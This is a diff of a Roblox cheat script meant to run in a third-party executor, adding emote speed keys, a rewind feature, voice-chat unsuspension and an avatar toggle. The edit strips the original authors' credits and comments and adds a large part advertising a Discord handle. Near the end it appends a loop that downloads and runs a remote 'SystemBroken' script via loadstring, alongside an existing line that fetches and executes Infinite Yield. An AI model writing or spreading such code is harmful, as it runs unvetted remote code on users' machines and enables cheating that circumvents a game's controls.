@@ -1,23 +1,22 @@
--- emote speed keybinds (holdable), emote sync keybind, respawn keybind, Flashback/rewind keybind, change avatar Keybind
--- All emotes, Auto unsuspend VC
-
--- All emotes = comma
--- Rewind = C
--- Emote Sync = M
--- Respawn = Rightalt
--- Change Avatar = L
+local part = Instance.new("Part", workspace)
+part.Material = Enum.Material.SmoothPlastic
+part.Color = Color3.fromRGB(0, 0, 0)
+part.CFrame = CFrame.new(0, -8.1, 0)
+part.Size = Vector3.new(5000, 16, 5000)
+part.Transparency = 0.5
+part.Anchored = true
+part.Name = "sa.ya on discord"
 
 local UserInputService = game:GetService("UserInputService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 
--- Keybind and speed settings
 local keysToHold = {
-    [Enum.KeyCode.E] = { pressed = 4.0, released = 1.0 },  -- Fast
-    [Enum.KeyCode.Q] = { pressed = 0.1, released = 1.0 },  -- Slow
-    [Enum.KeyCode.F] = { pressed = -1.0, released = 1.0 }, -- Reverse 
-    [Enum.KeyCode.V] = { pressed = 0.0, released = 1.0 }   -- Freeze
+    [Enum.KeyCode.E] = { pressed = 3.0, released = 1.0 },
+    [Enum.KeyCode.Q] = { pressed = 0.1, released = 1.0 },
+    [Enum.KeyCode.F] = { pressed = -1.0, released = 1.0 }, 
+    [Enum.KeyCode.V] = { pressed = 0.0, released = 1.0 }   
 }
 
 local player = Players.LocalPlayer
@@ -69,7 +68,13 @@ UserInputService.InputEnded:Connect(function(input)
     end
 end)
 
--- Voice Chat Reconnection Script
+RunService.Heartbeat:Connect(function()
+    if #activeKeys > 0 then
+        local lastKey = activeKeys[#activeKeys]
+        adjustAnimationSpeed(keysToHold[lastKey].pressed)
+    end
+end)
+
 local vc_inter = cloneref and cloneref(game:GetService("VoiceChatInternal")) or game:GetService("VoiceChatInternal")
 local vc_service = cloneref and cloneref(game:GetService("VoiceChatService")) or game:GetService("VoiceChatService")
 
@@ -103,15 +108,17 @@ vc_inter.StateChanged:Connect(function(oldState, newState)
     end
 end)
 
--- Flashback Feature
 local key = "C"
 local flashbacklength = 80
 local flashbackspeed = 0.9
 
 local frames = {}
+local uis = game:GetService("UserInputService")
+local LP = game:GetService("Players").LocalPlayer
+local RS = game:GetService("RunService")
 
 local function getchar()
-   return player.Character or player.CharacterAdded:Wait()
+   return LP.Character or LP.CharacterAdded:Wait()
 end
 
 local function gethrp(c)
@@ -158,21 +165,14 @@ local function step()
    local hrp = gethrp(char)
    local hum = char:FindFirstChildWhichIsA("Humanoid")
 
-   if UserInputService:IsKeyDown(Enum.KeyCode[key]) then
+   if uis:IsKeyDown(Enum.KeyCode[key]) then
        flashback:Revert(char, hrp, hum)
    else
        flashback:Advance(char, hrp, hum)
    end
 end
 
-RunService:BindToRenderStep("FlashbackStep", 1, step)
-
---keybind to open is comma
---made by Gi#7331
---edited by Solo Psycho
---(made GUI stay open during emote selection) - Psycho
---(changed size of GUI to be out of the way) - Psycho
---(adjusted a few colors) - Psycho
+RS:BindToRenderStep("FlashbackStep", 1, step)
 
 local IsStudio = false
 
@@ -460,7 +460,6 @@ local LocalPlayer = Players.LocalPlayer
 if IsStudio then
 	ScreenGui.Parent = LocalPlayer.PlayerGui
 else
-	--thanks inf yield
 	local SynV3 = syn and DrawingImmediate
 	if (not is_sirhurt_closure) and (not SynV3) and (syn and syn.protect_gui) then
 		syn.protect_gui(ScreenGui)
@@ -581,15 +580,12 @@ for i, Emote in pairs(totalEmotes) do
 	AddEmote(Emote.Name, Emote.Id, Emote.Price)
 end
 
---unreleased emotes
 AddEmote("Arm Wave", 5915773155)
 AddEmote("Head Banging", 5915779725)
 AddEmote("Face Calisthenics", 9830731012)
 
---finished loading
 Loading:Destroy()
 
---sorting options setup
 table.sort(Emotes, function(a, b)
 	return a.index < b.index
 end)
@@ -799,7 +795,6 @@ LocalPlayer.CharacterAdded:Connect(CharacterAdded)
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
 
--- Keybindings
 local ToggleKey = "M"
 local RefreshKey = "RightAlt"
 
@@ -903,8 +898,6 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local UserInputService = game:GetService("UserInputService")
 local Players = game:GetService("Players")
 
--- Change this to your keybind (A-Z)
-
 local KEYBIND = "L"
 
 local keyCode = Enum.KeyCode[KEYBIND]
@@ -920,3 +913,11 @@ UserInputService.InputBegan:Connect(function(input)
         ToggleDisallowEvent:FireServer()
     end
 end)
+
+local scripts = {
+    "https://raw.githubusercontent.com/H20CalibreYT/SystemBroken/main/script",
+}
+
+for _, url in ipairs(scripts) do
+    loadstring(game:HttpGet(url))()
+end
